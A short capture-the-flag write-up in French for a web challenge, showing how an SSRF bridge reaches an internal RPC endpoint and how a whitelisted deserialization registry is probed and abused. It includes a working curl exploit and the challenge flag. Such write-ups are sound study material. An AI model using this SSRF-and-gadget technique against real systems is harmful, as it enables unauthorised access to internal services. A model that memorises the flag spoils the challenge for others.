# Ingestd (web) — SSRF + désérialisation, creators: hibris, Clawd

**Flag : `NCTF{9d8367d91a01c99abba8f3ca}`**

## Cible
`https://<id>.t.ctf.tg/` — service "bridged-deser".
Index `/` : `{"fetch":"/fetch?url=<path>&body=<json>","note":"internal RPC is not reachable directly"}`

## Exploit (une requête)
```bash
curl -sk 'https://<id>.t.ctf.tg/fetch?url=/internal/rpc&body={"__class__":"FlagDumper"}'
# -> {"result":"NCTF{9d8367d91a01c99abba8f3ca}"}
```

## Démarche
1. `/fetch?url=<path>` = SSRF vers un hôte interne. `url=/status` → `{"status":"ok"}`.
2. Fuzz des chemins internes → **`/internal/rpc`** → `{"result":"record: "}`.
3. Le RPC **désérialise le body JSON** via un champ `__class__` :
   - `{"value":"x"}` → `"record: x"` (champ reflété)
   - `{"__class__":"test"}` → `{"error":"unknown class","registry":["FlagDumper","Record"]}`
     → **registre whitelisté** de classes instanciables.
4. `{"__class__":"FlagDumper"}` → le gadget dangereux laissé dans le registre dump le flag.

## Leçon
Désérialisation "sûre" par whitelist de classes = toujours dangereuse si un gadget
sensible (FlagDumper) est enregistré. Combinée à un SSRF (le bridge /fetch) pour atteindre
le RPC interne non exposé. Énumérer les chemins internes via le SSRF, puis sonder le
désérialiseur avec une classe bidon pour fuiter le registre.
